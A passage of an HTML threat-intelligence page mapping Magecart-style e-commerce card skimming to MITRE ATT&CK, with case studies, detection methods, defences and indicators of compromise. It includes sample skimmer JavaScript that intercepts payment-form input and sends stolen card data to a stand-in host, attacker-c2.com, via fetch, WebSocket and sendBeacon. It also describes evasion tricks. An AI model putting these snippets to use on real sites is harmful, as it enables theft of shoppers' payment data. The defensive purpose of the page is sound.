                      <a href="#custom-dom-manipulation" class="technique-link">CUSTOM</a>
                      <span class="status-badge observed">üî¥ Observed</span>
                      <span class="technique-name">DOM Manipulation (MutationObserver)</span>
                    </div>
                    <div class="technique-item">
                      <a href="#custom-payment-api" class="technique-link">CUSTOM</a>
                      <span class="status-badge observed">üî¥ Observed</span>
                      <span class="technique-name">Payment Request API Manipulation</span>
                    </div>
                    <div class="technique-item">
                      <a href="#custom-localstorage" class="technique-link">CUSTOM</a>
                      <span class="status-badge observed">üî¥ Observed</span>
                      <span class="technique-name">LocalStorage Scraping</span>
                    </div>
                  </td>
                  <td class="tactic-cell">
                    <div class="technique-item">
                      <a href="#t1071" class="technique-link">T1071</a>
                      <span class="status-badge observed">üî¥ Observed</span>
                      <span class="technique-name">Web Service</span>
                    </div>
                  </td>
                  <td class="tactic-cell">
                    <div class="technique-item">
                      <a href="#t1041" class="technique-link">T1041</a>
                      <span class="status-badge observed">üî¥ Observed</span>
                      <span class="technique-name">Exfiltration Over C2 Channel</span>
                    </div>
                    <div class="technique-item">
                      <a href="#custom-websocket-exfil" class="technique-link">CUSTOM</a>
                      <span class="status-badge observed">üî¥ Observed</span>
                      <span class="technique-name">WebSocket Exfiltration</span>
                    </div>
                    <div class="technique-item">
                      <a href="#custom-image-exfil" class="technique-link">CUSTOM</a>
                      <span class="status-badge observed">üî¥ Observed</span>
                      <span class="technique-name">Image-Based Exfiltration</span>
                    </div>
                    <div class="technique-item">
                      <a href="#custom-dns-tunnel" class="technique-link">CUSTOM</a>
                      <span class="status-badge emerging">üü° Emerging</span>
                      <span class="technique-name">DNS Tunneling</span>
                    </div>
                  </td>
                  <td class="tactic-cell">
                    <div class="technique-item">
                      <a href="#t1491-001" class="technique-link">T1491.001</a>
                      <span class="status-badge observed">üî¥ Observed</span>
                      <span class="technique-name">Internal Defacement (Fake Forms)</span>
                    </div>
                    <div class="technique-item">
                      <a href="#t1496" class="technique-link">T1496</a>
                      <span class="status-badge observed">üî¥ Observed</span>
                      <span class="technique-name">Resource Hijacking (Cryptojacking)</span>
                    </div>
                    <div class="technique-item">
                      <a href="#t1657" class="technique-link">T1657</a>
                      <span class="status-badge observed">üî¥ Observed</span>
                      <span class="technique-name">Financial Theft</span>
                    </div>
                    <div class="technique-item">
                      <a href="#t1565-002" class="technique-link">T1565.002</a>
                      <span class="status-badge emerging">üü° Emerging</span>
                      <span class="technique-name">Transmitted Data Manipulation</span>
                    </div>
                    <div class="technique-item">
                      <a href="#t1499" class="technique-link">T1499</a>
                      <span class="status-badge emerging">üü° Emerging</span>
                      <span class="technique-name">Endpoint Denial of Service</span>
                    </div>
                  </td>
                </tr>
              </tbody>
            </table>
          </div>
        </div>
      </section>

      <!-- Tactics & Techniques Section -->
      <section id="tactics">
        <div class="section-header">
          <div class="section-icon">üéØ</div>
          <h2>MITRE ATT&CK Tactics and Techniques</h2>
        </div>

        <!-- TA0001: Initial Access -->
        <h3 style="color: var(--accent-red)">TA0001: Initial Access</h3>
        <p>
          The techniques used by attackers to gain initial entry into the target e-commerce
          infrastructure.
        </p>

        <div class="card-grid">
          <div class="card">
            <div class="card-header">
              <span class="card-badge badge-technique">T1190</span>
            </div>
            <h4 class="card-title">Exploit Public-Facing Application</h4>
            <p class="card-description">
              Exploitation of vulnerabilities in e-commerce platforms to gain access.
            </p>

            <div class="card-meta">
              <div class="meta-item">
                <span class="meta-label">Key Example:</span>
                <span class="meta-value"
                  >CVE-2024-34102 (CosmicSting) - XXE vulnerability in Adobe Commerce/Magento 2.4.7
                  with CVSS 9.8/10</span
                >
              </div>
              <div class="meta-item">
                <span class="meta-label">Impact:</span>
                <span class="meta-value"
                  >3x increase in Magecart infections (11,000+ domains in 2024)</span
                >
              </div>
              <div class="meta-item">
                <span class="meta-label">Detection:</span>
                <span class="meta-value"
                  >WAF logs, unusual HTTP requests, XXE entity expansion</span
                >
              </div>
            </div>
          </div>

          <div class="card">
            <div class="card-header">
              <span class="card-badge badge-technique">T1078</span>
            </div>
            <h4 class="card-title">Valid Accounts (Stolen Credentials)</h4>
            <p class="card-description">
              Use of stolen or compromised credentials to access e-commerce admin panels.
            </p>

            <div class="card-meta">
              <div class="meta-item">
                <span class="meta-label">Examples:</span>
                <span class="meta-value">British Airways (2018), Newegg (2018)</span>
              </div>
              <div class="meta-item">
                <span class="meta-label">Method:</span>
                <span class="meta-value">Phishing, info-stealer malware, credential stuffing</span>
              </div>
              <div class="meta-item">
                <span class="meta-label">Detection:</span>
                <span class="meta-value"
                  >Unusual login times/locations, VPN usage, off-hours access</span
                >
              </div>
            </div>
          </div>

          <div class="card">
            <div class="card-header">
              <span class="card-badge badge-technique">T1195</span>
            </div>
            <h4 class="card-title">Supply Chain Compromise</h4>
            <p class="card-description">
              Manipulation of third-party services, libraries, or dependencies to inject malicious
              code.
            </p>

            <div class="card-meta">
              <div class="meta-item">
                <span class="meta-label">Examples:</span>
                <span class="meta-value"
                  >Ticketmaster (Inbenta chatbot - 40K victims), Forbes (fontsawesome.gq)</span
                >
              </div>
              <div class="meta-item">
                <span class="meta-label">Targets:</span>
                <span class="meta-value"
                  >CDN providers, analytics services, chat widgets, browser extensions</span
                >
              </div>
              <div class="meta-item">
                <span class="meta-label">Detection:</span>
                <span class="meta-value"
                  >SRI hash mismatches, CSP violations, unexpected script changes</span
                >
              </div>
            </div>
          </div>

          <div class="card">
            <div class="card-header">
              <span class="card-badge badge-technique">CUSTOM</span>
              <span class="status-badge observed">üî¥ Observed</span>
            </div>
            <h4 class="card-title" id="custom-gtm">Google Tag Manager Hijacking</h4>
            <p class="card-description">
              Compromising GTM containers to inject persistent skimmers that bypass traditional
              security controls.
            </p>

            <div class="card-meta">
              <div class="meta-item">
                <span class="meta-label">2025 Campaign:</span>
                <span class="meta-value"
                  >316 stores compromised, 88,000 victims, average 3.5 months persistence</span
                >
              </div>
              <div class="meta-item">
                <span class="meta-label">Method:</span>
                <span class="meta-value"
                  >Phishing GTM admin credentials ‚Üí Inject Base64-encoded skimmer in GTM container ‚Üí
                  Persistent across pages</span
                >
              </div>
              <div class="meta-item">
                <span class="meta-label">Evasion:</span>
                <span class="meta-value"
                  >Security tools whitelist GTM, skip container scanning. Backdoor in
                  media/index.php for re-infection</span
                >
              </div>
              <div class="meta-item">
                <span class="meta-label">Detection:</span>
                <span class="meta-value"
                  >GTM container audits, Base64 in GTM tags, network requests from GTM to non-Google
                  domains</span
                >
              </div>
            </div>
          </div>

          <div class="card">
            <div class="card-header">
              <span class="card-badge badge-technique">T1195.002</span>
              <span class="status-badge observed">üî¥ Observed</span>
            </div>
            <h4 class="card-title" id="t1195-002">NPM Supply Chain Attack (September 2025)</h4>
            <p class="card-description">
              Sophisticated attack on NPM ecosystem affecting 2 billion weekly downloads.
            </p>

            <div class="card-meta">
              <div class="meta-item">
                <span class="meta-label">Attack Vector:</span>
                <span class="meta-value"
                  >Phishing + MITM 2FA theft of Josh Junon (Qix) account</span
                >
              </div>
              <div class="meta-item">
                <span class="meta-label">Compromised:</span>
                <span class="meta-value"
                  >20 packages: chalk, debug, ansi-styles, supports-color, strip-ansi + 15
                  more</span
                >
              </div>
              <div class="meta-item">
                <span class="meta-label">Payload:</span>
                <span class="meta-value"
                  >Crypto wallet hijacking (ETH, BTC, SOL, TRX, LTC, BCH) targeting web
                  contexts</span
                >
              </div>
              <div class="meta-item">
                <span class="meta-label">Duration:</span>
                <span class="meta-value">2.5 hours exposure (September 8, 2025)</span>
              </div>
              <div class="meta-item">
                <span class="meta-label">Detection:</span>
                <span class="meta-value"
                  >Package.json monitoring, SRI for npm packages, post-install script auditing</span
                >
              </div>
            </div>
          </div>

          <div class="card">
            <div class="card-header">
              <span class="card-badge badge-technique">T1027.003</span>
              <span class="status-badge observed">üî¥ Observed</span>
            </div>
            <h4 class="card-title" id="t1027-003">Steganography Techniques</h4>
            <p class="card-description">
              Hiding malicious code in image metadata, CSS files, and favicons to bypass detection.
            </p>

            <div class="card-meta">
              <div class="meta-item">
                <span class="meta-label">CSS Steganography:</span>
                <span class="meta-value"
                  >Malicious code hidden in CSS file comments, extracted via obfuscated JS</span
                >
              </div>
              <div class="meta-item">
                <span class="meta-label">EXIF Metadata:</span>
                <span class="meta-value"
                  >Skimmer in JPEG "Copyright" field (Segway 2022: 600K visitors affected)</span
                >
              </div>
              <div class="meta-item">
                <span class="meta-label">PNG LSB:</span>
                <span class="meta-value"
                  >Code hidden in PNG least significant bits, alpha channel</span
                >
              </div>
              <div class="meta-item">
                <span class="meta-label">Favicon Alpha:</span>
                <span class="meta-value"
                  >512 bytes in 64x64 ICO transparency layer (2024 academic research)</span
                >
              </div>
              <div class="meta-item">
                <span class="meta-label">Detection:</span>
                <span class="meta-value"
                  >EXIF metadata scanning (ExifTool), CSS entropy analysis, statistical LSB
                  detection</span
                >
              </div>
            </div>
          </div>
        </div>

        <!-- TA0002: Execution -->
        <h3 style="color: var(--accent-orange); margin-top: 60px">TA0002: Execution</h3>
        <p>Techniques used to run malicious code on the victim's browser or server.</p>

        <div class="expandable">
          <div class="expandable-header">
            <h4>T1059.007: JavaScript Execution</h4>
            <span class="expand-icon">‚ñº</span>
          </div>
          <div class="expandable-content">
            <div class="expandable-body">
              <p>
                <strong>Description:</strong> Execution of malicious JavaScript in the victim's
                browser. All e-skimming attacks execute JavaScript client-side.
              </p>

              <h4>Attack Patterns:</h4>
              <ul>
                <li>
                  <strong>Form Submission Interception:</strong>
                  <code>addEventListener('submit', stealData)</code>
                </li>
                <li>
                  <strong>DOM-Based Monitoring:</strong> MutationObserver API, Shadow DOM abuse
                </li>
                <li>
                  <strong>Extension-Based Execution:</strong> Content scripts across all websites
                </li>
              </ul>

              <pre><code>// Form interception example
document.addEventListener('submit', function(e) {
    var cardData = extractPaymentData();
    exfiltrateToC2(cardData);
});

// Real-time monitoring
document.addEventListener('input', function(e) {
    if (isPaymentField(e.target)) {
        captureKeystroke(e.target.value);
    }
});</code></pre>

              <p>
                <strong>Detection:</strong> Unexpected event listeners on payment forms, CSP
                violations, browser extension anomalies
              </p>
            </div>
          </div>
        </div>

        <!-- TA0003: Persistence -->
        <h3 style="color: var(--accent-purple); margin-top: 60px">TA0003: Persistence</h3>
        <p>Techniques to maintain access and continue operations over extended periods.</p>

        <div class="card-grid">
          <div class="card">
            <div class="card-header">
              <span class="card-badge badge-technique">T1554</span>
            </div>
            <h4 class="card-title">File Modification (Compromise Client Software)</h4>
            <p class="card-description">
              Modification of legitimate JavaScript files to include skimmer code.
            </p>

            <div class="card-meta">
              <div class="meta-item">
                <span class="meta-label">Example:</span>
                <span class="meta-value"
                  >British Airways - 22 lines appended to Modernizr library (15 days, 380K
                  victims)</span
                >
              </div>
              <div class="meta-item">
                <span class="meta-label">Duration:</span>
                <span class="meta-value"
                  >Average 47 days undetected, range 2 weeks to 6 months</span
                >
              </div>
              <div class="meta-item">
                <span class="meta-label">Detection:</span>
                <span class="meta-value"
                  >File integrity monitoring (FIM), git diff alerts, code review</span
                >
              </div>
            </div>
          </div>

          <div class="card">
            <div class="card-header">
              <span class="card-badge badge-technique">T1176</span>
            </div>
            <h4 class="card-title">Browser Extensions</h4>
            <p class="card-description">
              Use of malicious or compromised browser extensions for persistent access.
            </p>

            <div class="card-meta">
              <div class="meta-item">
                <span class="meta-label">Examples:</span>
                <span class="meta-value">DataSpii, Great Suspender, crypto wallet extensions</span>
              </div>
              <div class="meta-item">
                <span class="meta-label">Capabilities:</span>
                <span class="meta-value"
                  >Cross-site access, bypass same-origin policy, persistent across sessions</span
                >
              </div>
              <div class="meta-item">
                <span class="meta-label">Detection:</span>
                <span class="meta-value"
                  >Excessive permissions, unexpected updates, network traffic from background
                  scripts</span
                >
              </div>
            </div>
          </div>
        </div>

        <!-- TA0005: Defense Evasion -->
        <h3 style="color: var(--accent-yellow); margin-top: 60px">TA0005: Defense Evasion</h3>
        <p>Techniques to avoid detection by security tools and analysts.</p>

        <div class="card-grid">
          <div class="card">
            <div class="card-header">
              <span class="card-badge badge-technique">T1027</span>
            </div>
            <h4 class="card-title">Obfuscated Files or Information</h4>
            <p class="card-description">Code obfuscation to evade detection and analysis.</p>

            <div class="card-meta">
              <div class="meta-item">
                <span class="meta-label">Techniques:</span>
                <span class="meta-value"
                  >Base64 encoding, multi-layer encoding, obfuscator.io, dead code injection</span
                >
              </div>
              <div class="meta-item">
                <span class="meta-label">Examples:</span>
                <span class="meta-value">Kritec skimmer, Gateway skimmer (multiple layers)</span>
              </div>
              <div class="meta-item">
                <span class="meta-label">Detection:</span>
                <span class="meta-value"
                  >High entropy, eval() with encoded args, static analysis tools</span
                >
              </div>
            </div>
          </div>

          <div class="card">
            <div class="card-header">
              <span class="card-badge badge-technique">T1622</span>
            </div>
            <h4 class="card-title">Debugger Evasion</h4>
            <p class="card-description">Anti-debugging techniques to prevent security analysis.</p>

            <div class="card-meta">
              <div class="meta-item">
                <span class="meta-label">Methods:</span>
                <span class="meta-value"
                  >Firebug detection, debugger statements, timing attacks, console override</span
                >
              </div>
              <div class="meta-item">
                <span class="meta-label">Example:</span>
                <span class="meta-value">Gateway skimmer checks for Firebug/DevTools</span>
              </div>
            </div>
          </div>

          <div class="card">
            <div class="card-header">
              <span class="card-badge badge-technique">T1480</span>
            </div>
            <h4 class="card-title">Execution Guardrails (Geofencing)</h4>
            <p class="card-description">
              Conditional execution based on environment to evade detection.
            </p>

            <div class="card-meta">
              <div class="meta-item">
                <span class="meta-label">Techniques:</span>
                <span class="meta-value"
                  >Country filtering, VPN detection, browser fingerprinting, VM detection
                  (WebGL)</span
                >
              </div>
              <div class="meta-item">
                <span class="meta-label">Detection:</span>
                <span class="meta-value"
                  >Environment checks, geolocation API usage, WebGL renderer queries</span
                >
              </div>
            </div>
          </div>

          <div class="card">
            <div class="card-header">
              <span class="card-badge badge-technique">T1036</span>
            </div>
            <h4 class="card-title">Masquerading</h4>
            <p class="card-description">
              Disguising malicious code as legitimate services or libraries.
            </p>

            <div class="card-meta">
              <div class="meta-item">
                <span class="meta-label">Methods:</span>
                <span class="meta-value"
                  >GTM disguise, analytics domains, 404 page hiding, image steganography</span
                >
              </div>
              <div class="meta-item">
                <span class="meta-label">Example:</span>
                <span class="meta-value">Segway (2022) - 600K+ records via image-hidden code</span>
              </div>
            </div>
          </div>

          <div class="card">
            <div class="card-header">
              <span class="card-badge badge-technique">CUSTOM</span>
              <span class="status-badge observed">üî¥ Observed</span>
            </div>
            <h4 class="card-title" id="custom-csp-bypass">CSP Bypass via Google Analytics</h4>
            <p class="card-description">
              Exfiltrating stolen data through attacker-controlled Google Analytics accounts to
              bypass CSP restrictions.
            </p>

            <div class="card-meta">
              <div class="meta-item">
                <span class="meta-label">Campaign:</span>
                <span class="meta-value"
                  >March 2024 Magecart campaign targeting several dozen e-commerce sites</span
                >
              </div>
              <div class="meta-item">
                <span class="meta-label">Method:</span>
                <span class="meta-value"
                  >Encode stolen card data ‚Üí Send to attacker's GA dashboard via legitimate GA
                  endpoints</span
                >
              </div>
              <div class="meta-item">
                <span class="meta-label">Bypass:</span>
                <span class="meta-value"
                  >CSP allows Google Analytics by default, attackers abuse whitelisted service</span
                >
              </div>
              <div class="meta-item">
                <span class="meta-label">Detection:</span>
                <span class="meta-value"
                  >GA measurement ID validation, unexpected GA traffic patterns, data encoding in GA
                  events</span
                >
              </div>
            </div>
          </div>

          <div class="card">
            <div class="card-header">
              <span class="card-badge badge-technique">T1497.001</span>
              <span class="status-badge observed">üî¥ Observed</span>
            </div>
            <h4 class="card-title" id="t1497-001">VM/Sandbox Evasion (WebGL Detection)</h4>
            <p class="card-description">
              Detecting analysis environments via WebGL renderer queries to avoid security
              researchers.
            </p>

            <div class="card-meta">
              <div class="meta-item">
                <span class="meta-label">Technique:</span>
                <span class="meta-value"
                  >Query WebGL renderer for "swiftshader", "llvmpipe", "virtualbox" signatures</span
                >
              </div>
              <div class="meta-item">
                <span class="meta-label">Examples:</span>
                <span class="meta-value">Advanced Magecart variants, Gateway skimmer</span>
              </div>
              <div class="meta-item">
                <span class="meta-label">Impact:</span>
                <span class="meta-value"
                  >Skimmer only executes on real victim browsers, skips analysis VMs</span
                >
              </div>
              <div class="meta-item">
                <span class="meta-label">Detection:</span>
                <span class="meta-value"
                  >Monitor WebGL API calls, renderer string queries, environment
                  fingerprinting</span
                >
              </div>
            </div>
          </div>
        </div>

        <!-- TA0009: Collection -->
        <h3 style="color: var(--accent-blue); margin-top: 60px">TA0009: Collection</h3>
        <p>Techniques to gather payment card data and personal information from victims.</p>

        <div class="expandable">
          <div class="expandable-header">
            <h4>T1056: Input Capture</h4>
            <span class="expand-icon">‚ñº</span>
          </div>
          <div class="expandable-content">
            <div class="expandable-body">
              <p><strong>Description:</strong> Capturing user input from payment forms.</p>

              <h4>Sub-Techniques:</h4>
              <ul>
                <li>
                  <strong>T1056.001 Keylogging:</strong> Real-time keystroke capture as user types
                </li>
                <li>
                  <strong>T1056.002 GUI Input Capture:</strong> Form submission interception, change
                  event monitoring
                </li>
              </ul>

              <h4>Data Collected:</h4>
              <ul>
                <li>Payment card data (number, CVV, expiry, cardholder name)</li>
                <li>Billing information (address, ZIP, phone, email)</li>
                <li>Personal information (name, email, account credentials)</li>
                <li>Session data (cookies, localStorage, sessionStorage)</li>
                <li>Device fingerprint (browser, OS, screen resolution, timezone)</li>
              </ul>

              <pre><code>// Form submission interception
document.querySelector('form').addEventListener('submit', function(e) {
    var cardData = {
        number: document.querySelector('#card-number').value,
        cvv: document.querySelector('#cvv').value,
        expiry: document.querySelector('#expiry').value,
        billing: {/* ... */}
    };
    exfiltrate(cardData);
});</code></pre>

              <p>
                <strong>Detection:</strong> Unexpected event listeners on payment forms, input event
                handlers, localStorage writes with payment data
              </p>
            </div>
          </div>
        </div>

        <div class="card-grid" style="margin-top: 20px">
          <div class="card">
            <div class="card-header">
              <span class="card-badge badge-technique">T1005</span>
            </div>
            <h4 class="card-title">Data from Local System</h4>
            <p class="card-description">Collection of data stored locally in browser storage.</p>

            <div class="card-meta">
              <div class="meta-item">
                <span class="meta-label">Targets:</span>
                <span class="meta-value">localStorage, sessionStorage, cookies, IndexedDB</span>
              </div>
              <div class="meta-item">
                <span class="meta-label">Example:</span>
                <span class="meta-value"
                  >Multi-form Magecart collecting data across multiple pages</span
                >
              </div>
            </div>
          </div>
        </div>

        <!-- TA0010: Exfiltration -->
        <h3 style="color: var(--accent-pink); margin-top: 60px">TA0010: Exfiltration</h3>
        <p>Techniques to transmit stolen payment data to attacker-controlled infrastructure.</p>

        <div class="expandable">
          <div class="expandable-header">
            <h4>T1041: Exfiltration Over C2 Channel</h4>
            <span class="expand-icon">‚ñº</span>
          </div>
          <div class="expandable-content">
            <div class="expandable-body">
              <p>
                <strong>Description:</strong> Sending stolen data to command and control servers.
              </p>

              <h4>Exfiltration Methods:</h4>

              <div class="card-grid">
                <div class="card">
                  <h4 class="card-title">HTTP POST (Most Common)</h4>
                  <pre><code>fetch('https://attacker-c2.com/collect', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify(stolenData),
    mode: 'no-cors'
});</code></pre>
                </div>

                <div class="card">
                  <h4 class="card-title">WebSocket</h4>
                  <pre><code>var ws = new WebSocket('wss://attacker-c2.com/ws');
ws.onopen = function() {
    ws.send(JSON.stringify(stolenData));
};</code></pre>
                </div>

                <div class="card">
                  <h4 class="card-title">Beacon API</h4>
                  <pre><code>navigator.sendBeacon(
    'https://attacker-c2.com/beacon',
    JSON.stringify(stolenData)
);</code></pre>
                </div>
              </div>

              <h4>C2 Domain Characteristics:</h4>
              <ul>
                <li><strong>Lookalike domains:</strong> google-analytics.net, analytics-cdn.com</li>
                <li><strong>British Airways example:</strong> baways.com (lookalike domain)</li>
                <li><strong>Fast flux:</strong> Rapidly changing IP addresses</li>
                <li><strong>Bulletproof hosting:</strong> Resistant to takedown</li>
              </ul>

              <p>
                <strong>Detection:</strong> Unexpected POST requests, WebSocket to unusual domains,
                Beacon API in payment context, requests to newly registered domains
              </p>
            </div>
          </div>
        </div>
      </section>

      <!-- Detection & Defense Section -->
      <section id="detection">
        <div class="section-header">
          <div class="section-icon">üîç</div>
          <h2>Detection & Mitigation Matrix</h2>
        </div>

        <div class="table-wrapper">
          <table>
            <thead>
              <tr>
                <th>Attack Stage</th>
                <th>Detection Method</th>
                <th>Tools</th>
                <th>Indicators</th>
              </tr>
            </thead>
            <tbody>
              <tr>
                <td><strong>Initial Access</strong></td>
                <td>Log monitoring, WAF</td>
                <td>SIEM, WAF, Access Reviews</td>
                <td>Unusual admin access, exploit attempts</td>
              </tr>
              <tr>
                <td><strong>Execution</strong></td>
                <td>CSP violations, script analysis</td>
                <td>Browser DevTools, Semgrep, AI analysis</td>
                <td>Unexpected scripts, CSP reports</td>
              </tr>
              <tr>
                <td><strong>Persistence</strong></td>
                <td>SDLC integrity checks, CDN/WAF injection monitoring</td>
                <td>OSSEC, Tripwire</td>
                <td>File modifications, unauthorized changes</td>
              </tr>
              <tr>
                <td><strong>Defense Evasion</strong></td>
                <td>Static analysis, deobfuscation, selective execution</td>
                <td>
                  de4js,
                  <a
                    href="https://jsdeobf.github.io/"
                    target="_blank"
                    style="color: var(--accent-blue); text-decoration: underline"
                    >JsDeObsBench</a
                  >, js-beautify, script analysis
                </td>
                <td>High entropy, eval(), obfuscation, detection of analysis tools/environment</td>
              </tr>
              <tr>
                <td><strong>Collection</strong></td>
                <td>Runtime monitoring, event analysis</td>
                <td>Custom scripts, extensions</td>
                <td>Unexpected form access, input listeners, form overlay</td>
              </tr>
              <tr>
                <td><strong>Exfiltration</strong></td>
                <td>3rd party key/id monitor, CSP-report-only</td>
                <td>CSP-report-only custom monitor, HAR change detection</td>
                <td>New domains, especially typo-squatted ones</td>
              </tr>
            </tbody>
          </table>
        </div>
      </section>

      <!-- Defense Strategies Section -->
      <section id="defense">
        <div class="section-header">
          <div class="section-icon">üõ°Ô∏è</div>
          <h2>Defense Strategies</h2>
        </div>

        <div class="card-grid">
          <div class="card">
            <div class="card-header">
              <span class="card-badge badge-defense">Preventive</span>
            </div>
            <h4 class="card-title">Content Security Policy (CSP)</h4>
            <p class="card-description">Restrict script sources and block unauthorized scripts.</p>
            <pre><code>&lt;meta http-equiv="Content-Security-Policy"
      content="default-src 'self';
               script-src 'self' https://trusted-cdn.com;
               connect-src 'self';
               report-uri /csp-report"&gt;</code></pre>
            <div class="card-meta">
              <div class="meta-item">
                <span class="meta-label">Mitigates:</span>
                <span class="meta-value">Unauthorized script execution, inline scripts</span>
              </div>
            </div>
          </div>

          <div class="card">
            <div class="card-header">
              <span class="card-badge badge-defense">Preventive</span>
            </div>
            <h4 class="card-title">Subresource Integrity (SRI)</h4>
            <p class="card-description">Cryptographic hash verification for external scripts.</p>
            <pre><code>&lt;script src="https://cdn.example.com/lib.js"
        integrity="sha384-oqVuAfXRKap7..."
        crossorigin="anonymous"&gt;&lt;/script&gt;</code></pre>
            <div class="card-meta">
              <div class="meta-item">
                <span class="meta-label">Mitigates:</span>
                <span class="meta-value">CDN compromise, unauthorized script modifications</span>
              </div>
            </div>
          </div>

          <div class="card">
            <div class="card-header">
              <span class="card-badge badge-defense">Preventive</span>
            </div>
            <h4 class="card-title">Multi-Factor Authentication (MFA)</h4>
            <p class="card-description">Prevent credential-based compromise of admin accounts.</p>
            <div class="card-meta">
              <div class="meta-item">
                <span class="meta-label">Mitigates:</span>
                <span class="meta-value">Stolen credentials, phishing, credential stuffing</span>
              </div>
              <div class="meta-item">
                <span class="meta-label">Required:</span>
                <span class="meta-value"
                  >All admin accounts, developer access, production systems</span
                >
              </div>
            </div>
          </div>

          <div class="card">
            <div class="card-header">
              <span class="card-badge badge-defense">Detective</span>
            </div>
            <h4 class="card-title">File Integrity Monitoring (FIM)</h4>
            <p class="card-description">Detect unauthorized file modifications in real-time.</p>
            <div class="card-meta">
              <div class="meta-item">
                <span class="meta-label">Tools:</span>
                <span class="meta-value">OSSEC, Tripwire, AIDE</span>
              </div>
              <div class="meta-item">
                <span class="meta-label">Coverage:</span>
                <span class="meta-value">All production JavaScript, HTML, CSS files</span>
              </div>
            </div>
          </div>

          <div class="card">
            <div class="card-header">
              <span class="card-badge badge-defense">Detective</span>
            </div>
            <h4 class="card-title">Network Monitoring</h4>
            <p class="card-description">Monitor all outbound traffic from checkout pages.</p>
            <div class="card-meta">
              <div class="meta-item">
                <span class="meta-label">Tools:</span>
                <span class="meta-value">Suricata, Snort, Zeek</span>
              </div>
              <div class="meta-item">
                <span class="meta-label">Alerts:</span>
                <span class="meta-value">Requests to unknown/suspicious domains</span>
              </div>
            </div>
          </div>

          <div class="card">
            <div class="card-header">
              <span class="card-badge badge-defense">Detective</span>
            </div>
            <h4 class="card-title">Behavioral Monitoring</h4>
            <p class="card-description">Monitor form field access patterns and event listeners.</p>
            <pre><code>// Monitor unauthorized form access
Object.defineProperty(HTMLInputElement.prototype, 'value', {
    get: function() {
        if (isPaymentField(this) && !isAuthorized()) {
            console.trace('Unauthorized access!');
        }
        return originalGetter.call(this);
    }
});</code></pre>
          </div>
        </div>
      </section>

      <!-- Case Studies Section -->
      <section id="case-studies">
        <div class="section-header">
          <div class="section-icon">üìö</div>
          <h2>Real-World Case Studies</h2>
        </div>

        <div class="timeline">
          <div class="timeline-item">
            <div class="timeline-title">British Airways (August 2018)</div>
            <div class="timeline-content">
              <strong>Attack Chain:</strong> Initial Access (T1078) ‚Üí Execution (T1059.007) ‚Üí
              Persistence (T1554) ‚Üí Collection (T1056.002) ‚Üí Exfiltration (T1041)<br /><br />
              <strong>Details:</strong> Stolen admin credentials (no MFA) ‚Üí Modified Modernizr
              library ‚Üí 22-line skimmer ‚Üí Form submission interception ‚Üí HTTP POST to baways.com<br /><br />
              <strong>Impact:</strong> 380,000 victims | 15 days undetected | ¬£20M ICO fine<br /><br />
              <strong>Detection Failure:</strong> No FIM, no behavioral monitoring, discovered via
              customer fraud reports
            </div>
          </div>

          <div class="timeline-item">
            <div class="timeline-title">Ticketmaster (June 2018)</div>
            <div class="timeline-content">
              <strong>Attack Chain:</strong> Supply Chain Compromise (T1195.002) ‚Üí Execution
              (T1059.007) ‚Üí Collection (T1056) ‚Üí Exfiltration (T1041)<br /><br />
              <strong>Details:</strong> Compromised Inbenta chatbot third-party service ‚Üí Malicious
              code in chatbot script<br /><br />
              <strong>Impact:</strong> 40,000 victims | ¬£1.25M fine<br /><br />
              <strong>Key Lesson:</strong> Third-party scripts require SRI and CSP controls
            </div>
          </div>

          <div class="timeline-item">
            <div class="timeline-title">CosmicSting / CVE-2024-34102 (2024)</div>
            <div class="timeline-content">
              <strong>Attack Chain:</strong> Exploit Vulnerability (T1190) ‚Üí Execution ‚Üí
              Persistence<br /><br />
              <strong>Details:</strong> XXE vulnerability in Adobe Commerce/Magento 2.4.7 (CVSS 9.8)
              ‚Üí Remote code execution ‚Üí Skimmer installation<br /><br />
              <strong>Impact:</strong> 3x increase in Magecart infections | 11,000+ domains
              compromised<br /><br />
              <strong>Detection:</strong> WAF rules for XXE, unusual XML requests, file system
              changes
            </div>
          </div>

          <div class="timeline-item">
            <div class="timeline-title">Google Tag Manager Hijacking Campaign (2025)</div>
            <div class="timeline-content">
              <strong>Attack Chain:</strong> Stolen Credentials (T1078) ‚Üí GTM Container Poisoning
              (CUSTOM) ‚Üí Persistence ‚Üí Defense Evasion (T1036) ‚Üí Collection (T1056) ‚Üí Exfiltration
              (T1041)<br /><br />
              <strong>Details:</strong> Phishing GTM admin accounts ‚Üí Inject Base64-encoded skimmer
              in GTM container (GTM-MLHK2N68) ‚Üí Backdoor in media/index.php ‚Üí 3.5 months average
              persistence<br /><br />
              <strong>Impact:</strong> 316 stores compromised | 88,000 victims | Evasion via GTM
              whitelisting<br /><br />
              <strong>Key Lesson:</strong> GTM containers require security audits, Base64 detection,
              and tag approval workflows
            </div>
          </div>

          <div class="timeline-item">
            <div class="timeline-title">NPM Supply Chain Attack (September 2025)</div>
            <div class="timeline-content">
              <strong>Attack Chain:</strong> Supply Chain Compromise (T1195.002) ‚Üí Credential Theft
              ‚Üí Execution<br /><br />
              <strong>Details:</strong> Phishing + MITM 2FA theft of Josh Junon (Qix) ‚Üí Compromised
              20 packages (chalk, debug, ansi-styles, etc.) ‚Üí Crypto wallet hijacking payload<br /><br />
              <strong>Impact:</strong> 2 billion weekly downloads affected | 2.5 hours exposure |
              Targets ETH, BTC, SOL, TRX, LTC, BCH wallets<br /><br />
              <strong>Detection Failure:</strong> No runtime package verification, post-install
              scripts executed without review
            </div>
          </div>
        </div>
      </section>

      <!-- IOCs Section -->
      <section id="iocs">
        <div class="section-header">
          <div class="section-icon">‚ö†Ô∏è</div>
          <h2>Indicators of Compromise (IOCs)</h2>
        </div>

        <div class="card-grid">
          <div class="card">
            <h4 class="card-title">Network Indicators</h4>
            <ul>
              <li>Newly registered domains (< 30 days)</li>
              <li>Bulletproof hosting providers</li>
              <li>Typosquatting domains (baways.com, fontsawesome.gq)</li>
              <li>POST requests from checkout to unknown domains</li>
              <li>WebSocket connections to non-legitimate endpoints</li>
              <li>Large URL parameters on image requests</li>
            </ul>
          </div>

          <div class="card">
            <h4 class="card-title">Host Indicators</h4>
            <ul>
              <li>Modified JavaScript files outside deploy windows</li>
              <li>Unexpected event listeners on payment forms</li>
              <li>localStorage/sessionStorage with payment field names</li>
              <li>Browser extensions with excessive permissions</li>
              <li>File hash mismatches for production scripts</li>
            </ul>
          </div>

          <div class="card">
            <h4 class="card-title">Code Indicators</h4>
            <ul>
              <li><code>eval(atob(...))</code> patterns</li>
              <li>High-entropy variable names (_0x1a2b3c)</li>
              <li>Payment field CSS selectors</li>
              <li>Debugger detection code</li>
